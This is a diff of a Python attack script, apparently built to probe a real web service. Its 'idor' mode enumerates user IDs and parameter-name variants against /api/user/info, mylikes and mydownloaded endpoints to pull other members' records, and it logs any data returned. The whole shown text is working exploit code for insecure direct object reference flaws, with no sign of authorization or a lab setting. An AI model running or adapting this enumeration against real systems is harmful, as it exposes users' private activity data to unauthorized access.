@@ -74,18 +74,51 @@ if mode == "activity":
         time.sleep(0.4)
 
 elif mode == "idor":
-    log("=== IDOR: 会员用户数据越权 ===")
-    # mydownloaded/mylikes/history 带 user_id
-    for uid in [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 20, 50, 100]:
-        for ep in ["mydownloaded", "mylikes", "history"]:
-            st, b = req("GET", "/api/user/%s?user_id=%d&page=1" % (ep, uid), headers=H)
-            res.append({"t": "%s-%d" % (ep, uid), "s": st, "b": b[:400]})
-            if st == 200:
-                log(
-                    ">>> %s?user_id=%d: %s %s"
-                    % (ep, uid, st, b[:200].replace("\n", " "))
-                )
-            time.sleep(0.3)
+    log("=== IDOR: 枚举会员用户 ===")
+    # user/info 参数变体
+    for pname in ["user_id", "uid", "id", "userId", "member_id"]:
+        st, b = req("GET", "/api/user/info?%s=1" % pname, headers=H)
+        res.append({"t": "info-%s" % pname, "s": st, "b": b[:300]})
+        log("info?%s=1: %s %s" % (pname, st, b[:130].replace("\n", " ")))
+        time.sleep(0.3)
+    # mylikes 枚举(找有数据的用户)
+    for uid in range(100, 2600, 40):
+        st, b = req("GET", "/api/user/mylikes?user_id=%d&page=1" % uid, headers=H)
+        res.append({"t": "ml-%d" % uid, "s": st, "b": b[:300]})
+        if st == 200:
+            try:
+                data = json.loads(b).get("data") or []
+                if data:
+                    log(
+                        ">>> mylikes user_id=%d 有 %d 条! %s"
+                        % (uid, len(data), b[:250].replace("\n", " "))
+                    )
+                else:
+                    log("mylikes user_id=%d: 200 空" % uid)
+            except Exception:
+                log("mylikes user_id=%d: %s" % (uid, b[:100]))
+        time.sleep(0.3)
+        if st == 403:
+            break
+    # mydownloaded 枚举(找有下载的会员)
+    for uid in range(100, 1600, 40):
+        st, b = req("GET", "/api/user/mydownloaded?user_id=%d&page=1" % uid, headers=H)
+        res.append({"t": "mdl-%d" % uid, "s": st, "b": b[:300]})
+        if st == 200:
+            try:
+                data = json.loads(b).get("data") or []
+                if data:
+                    log(
+                        ">>> mydownloaded user_id=%d 有 %d 条! %s"
+                        % (uid, len(data), b[:300].replace("\n", " "))
+                    )
+                else:
+                    log("mydownloaded user_id=%d: 200 空" % uid)
+            except Exception:
+                log("mydownloaded user_id=%d: %s" % (uid, b[:100]))
+        time.sleep(0.3)
+        if st == 403:
+            break
     # 其他参数名变体
     for pname in ["user_id", "uid", "id", "user", "member_id", "userId"]:
         st, b = req("GET", "/api/user/mydownloaded?%s=1&page=1" % pname, headers=H)
